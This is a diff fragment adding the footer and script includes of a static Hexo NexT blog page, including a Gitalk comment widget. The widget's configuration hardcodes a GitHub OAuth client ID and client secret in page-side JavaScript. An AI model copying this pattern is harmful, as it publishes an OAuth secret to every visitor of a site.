+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
